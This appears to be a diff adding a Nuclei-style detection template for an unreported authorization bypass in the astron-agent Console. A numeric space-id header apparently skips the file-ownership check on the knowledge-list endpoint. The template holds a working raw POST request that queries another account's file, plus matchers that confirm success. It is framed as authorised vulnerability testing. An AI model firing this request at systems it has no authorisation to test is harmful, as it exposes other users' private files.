@@ -1,0 +1,61 @@
+# Detects the space-id header behaviour of the Console knowledge-list endpoint.
+#
+# REQUIRES: a low-privilege Console JWT and a test file id owned by ANOTHER of your
+# own test accounts on the target (never a real third party's file). The template
+# sends ONE request with `space-id: 1` — the same request an authorised tester
+# replays manually in the two-account differential.
+#
+# A match means: an authenticated low-privilege caller submitting this header
+# received a successful knowledge query for a file it does not own. Compare
+# manually with the same request WITHOUT the header (poc/v2_...py does the
+# differential and asserts it).
+id: astron-agent-console-spaceid-bypass
+info:
+  name: astron-agent Console - knowledge records served with arbitrary space-id header
+  author: rinne666
+  severity: medium
+  classification:
+    cwe-id: CWE-639
+  metadata:
+    max-request: 1
+    product: astron-agent
+    disclosure: unreported
+  description: |
+    FileInfoV2Service.listKnowledgeByPage skips checkFileBelong whenever the
+    client-supplied space-id header parses as a number
+    (console/backend/toolkit/.../FileInfoV2Service.java:903-930). Any parseable
+    value works; the victim's real space id is not needed.
+
+variables:
+  jwt: "{{jwt}}"
+  victim_file_id: "{{victim_file_id}}"
+
+http:
+  - raw:
+      - |
+        POST /file/list-knowledge-by-page HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Authorization: Bearer {{jwt}}
+        space-id: 1
+
+        {"fileIds":[{{victim_file_id}}],"pageNo":1,"pageSize":10}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"code"'
+          - '"total"'
+        condition: and
+      - type: word
+        part: body
+        words:
+          - "denied"
+          - "Permission"
+          - "无权"
+        negative: true
+        condition: or
